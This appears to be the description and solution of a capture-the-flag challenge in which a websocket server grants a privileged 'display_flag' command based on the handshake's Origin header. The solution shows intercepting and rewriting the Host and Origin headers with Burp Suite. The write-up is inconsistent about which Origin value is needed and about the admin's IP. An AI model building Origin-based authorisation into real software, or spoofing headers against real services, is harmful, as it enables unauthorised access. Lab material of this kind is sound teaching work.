pivotplanehinge is a Websocket CSRF vulnerability. The name comes from the types of joints in the human body -
Pivot, Hinge, Saddle, Plane, __Ball and Socket__.

It provides a simple websocket client. The interface establishes a websocket connection
with the server and some simple commands are available to the user. The user is able to perform several arbitrary commands,
and one that lists a hostname for all connected websocket clients. There will always be the IP address 127.0.0.1 with hostname "admin" shown as connected.
This represents a client that has privileges that allow them to execute a "display_flag" command. When an unprivileged user
attempts to run "display_flag", they are given an error message.

The security for the "display_flag" command is enforced based on the Origin header of the websocket handshake when 
the websocket connection is originally established. Using burp suite, wireshark or the developer console of a browser will show the HTTP 
request that is being made when the handshake is performed, complete with the header value e.g. "Origin: unprivileged_user1"

In order to successfully run the "display_flag" command, the user must perform websocket CSRF by modifying the Origin header on
the websocket handshake to "Origin: admin".

Solution: use burpsuite to intercept and change the Websocket connect handshake from, e.g.:
```
GET /echo HTTP/1.1
Host: 127.0.0.1:8079
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Upgrade: websocket
Origin: http://127.0.0.1:8079
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Sec-WebSocket-Key: 0nEERxAieXXOmoJVu/BIwQ==
```

to

```
GET /echo HTTP/1.1
Host: 8.8.8.8:8079
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Upgrade: websocket
Origin: http://8.8.8.8:8079
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Sec-WebSocket-Key: e0kTEcf67+qSMBZN9+wWVA==
```

Note Host, Origin 127.0.0.1 -> 8.8.8.8
In order for the Websocket CSRF to work, __both__ Host and Origin must point to the same IP, 8.8.8.8 (the IP of the imaginary Admin account).
